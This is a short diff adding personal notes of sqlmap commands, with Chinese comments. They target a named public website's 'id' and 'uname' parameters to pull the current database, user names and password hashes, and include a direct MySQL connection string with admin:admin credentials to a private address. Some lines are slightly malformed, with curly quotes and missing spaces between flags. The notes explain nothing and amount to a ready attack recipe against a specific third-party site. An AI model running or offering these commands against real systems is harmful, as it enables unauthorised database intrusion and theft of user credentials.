@@ -1,2 +1,8 @@
 ﻿sqlmap
+http:// ?id=1
 sqlmap.py -d”mysql://admin:admin@192.168.21.17:3306/testdb” -f –banner –dbs–users
+sqlmap -u "https://www.wts999.com/?id=1&us=4&uname=admin" -p "uname" --current-db
+sqlmap -u "https://www.wts999.com/?id=1" -p "id" --current-db
+sqlmap -u "https://www.wts999.com/?id=1" -p "id" --current-db --os windows 或者 --os linux
+sqlmap -u "https://www.wts999.com/?id=1" --technique U --password # 密码
+sqlmap -u "https://www.wts999.com/?id=1" --technique U --users   # 用户名，
